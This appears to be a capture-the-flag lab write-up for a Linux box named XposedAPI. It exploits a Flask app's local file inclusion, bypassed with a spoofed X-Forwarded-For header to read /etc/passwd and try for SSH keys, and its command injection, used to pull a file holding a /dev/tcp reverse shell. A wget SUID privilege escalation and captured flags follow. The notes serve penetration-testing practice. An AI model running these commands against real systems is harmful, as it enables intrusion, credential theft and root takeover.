# XposedAPI \[Linux]

## Summary

* Blind OS injection can happen even without confirming via ping?
* `nc $ip` seems to be a decent replacement for ping, check the screenshots
* Tried `'payload file | sh'` for instant exec but no luck \[maybe curl ELF payload vis msfvenom and pipe to sh] - Did not work, the revshell only works because the initial curl command fails if it hits the next part of the payload aka nc comm does not run
* If direct blind OS injection did not work, we would have to identify where the curl output would be stored which in this case we can if we read main.py from LFI and see it is stored in app - This did not work either calling home/clumsyadmin/app after curl did nothing which was very surprising
* A recurring theme with flask and other python-based apps is the use of main.py, can be useful for future LFI hits
* POST request may return Server Errors without appropriate data

## Enumeration

```
192.168.143.134
Nmap scan report for 192.168.143.134
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
13337/tcp open  http    Gunicorn 20.0.4
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### UDP

```
Nothing
```

### Files

{% code title="main.py" %}
```
#!/usr/bin/env python3
from flask import Flask, jsonify, request, render_template, Response
from Crypto.Hash import MD5
import json, os, binascii
app = Flask(__name__)

@app.route('/')
def home():
    return(render_template("home.html"))

@app.route('/update', methods = ["POST"])
def update():
    if request.headers['Content-Type'] != "application/json":
        return("Invalid content type.")
    else:
        data = json.loads(request.data)
        if data['user'] != "clumsyadmin":
            return("Invalid username.")
        else:
            os.system("curl {} -o /home/clumsyadmin/app".format(data['url']))
            return("Update requested by {}. Restart the software for changes to take effect.".format(data['user']))

@app.route('/logs')
def readlogs():
  if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
  else:
        ip = "1.3.3.7"
  if ip == "localhost" or ip == "127.0.0.1":
    if request.args.get("file") == None:
        return("Error! No file specified. Use file=/path/to/log/file to access log files.", 404)
    else:
        data = ''
        with open(request.args.get("file"), 'r') as f:
            data = f.read()
            f.close()
        return(render_template("logs.html", data=data))
  else:
       return("WAF: Access Denied for this Host.",403)

@app.route('/version')
def version():
    hasher = MD5.new()
    appHash = ''
    with open("/home/clumsyadmin/app", 'rb') as f:
        d = f.read()
        hasher.update(d)
        appHash = binascii.hexlify(hasher.digest()).decode()
    return("1.0.0b{}".format(appHash))

@app.route('/restart', methods = ["GET", "POST"])
def restart():
    if request.method == "GET":
        return(render_template("restart.html"))
    else:
        os.system("killall app")
        os.system("bash -c '/home/clumsyadmin/app&'")
        return("Restart Successful.")
```
{% endcode %}

### Ports

#### 13337

```
Usage:

/
Methods: GET
Returns this page.

/version
Methods: GET
Returns version of the app running.

/update
Methods: POST
Updates the app using a linux executable. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}

/logs
Methods: GET
Read log files.

/restart
Methods: GET

To request the restart of the app.
```

Why sending POST request to update returns this

```
curl -X POST http://192.168.143.134:13337/update                  
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

Accessing logs returns this, add header for localhost?

```
WAF: Access Denied for this Host.
```

Accessing logs is the way for sure not update

```
curl -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1"  http://192.168.143.134:13337/logs
Error! No file specified. Use file=/path/to/log/file to access log files. 
```

LFI Baby

```
curl -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1"  http://192.168.143.134:13337/logs?file=/etc/passwd
```

<div align="left"><figure><img src="../../.gitbook/assets/image (64).png" alt="" width="563"><figcaption></figcaption></figure></div>

Couldn't retrieve SSH keys, for `id_ecdsa` and `id_ed25519` as well

```
curl -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1"  http://192.168.143.134:13337/logs?file='/home/clumsyadmin/.ssh/id_rsa'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

cmdline gives us this

```
/usr/bin/python3/usr/local/bin/gunicorn-w4-b0.0.0.0:13337main:app
```

No .`sh_history` seeing the output from etc/passwd

### Exploits

None - OS command injection

### Loot

#### Creds

`clumsyadmin` - No creds (Got username from LFI via /logs endpoint)

#### Flags

```
7e2057c385da117bfeec4b6e99283393
76b3ed4b74c6ab6c36c70b911ae18ba8
```

## Initial Foothold

Now that we got username from LFI via logs, use update endpoint to 'update' software and point URL to our Python server

```
curl -X POST -H "Content-Type: application/json" --data '{"user":"clumsyadmin","url":"http://192.168.45.192/wh"}'  http://192.168.143.134:13337/update 
Update requested by clumsyadmin. Restart the software for changes to take effect.  
```

<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure></div>

{% code title="wh" %}
```
/bin/sh -i >& /dev/tcp/192.168.45.192/80 0>&1
```
{% endcode %}

But on restarting, we get no shell with both ports 80 and 13337

Tried 'payload file | sh' for instant exec but no luck

The web server is off here when we get command execution otherwise it keeps trying to connect to our server and does not get to the nc payload

<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure></div>

Our python server was offline when this command injection worked

## PrivEsc

`wget` SUID - GTFOBins

```
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```

We get euid=0 and can read everything with privs we have but is it enough? group, id and everything else remains the same

## Post Exploitation

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

#### Trying to run ELF we uploaded instead of direct OS injection

The web server was off for the last command but still no luck

<div align="left"><figure><img src="../../.gitbook/assets/image (71).png" alt="" width="491"><figcaption></figcaption></figure></div>

<div align="left"><figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure></div>
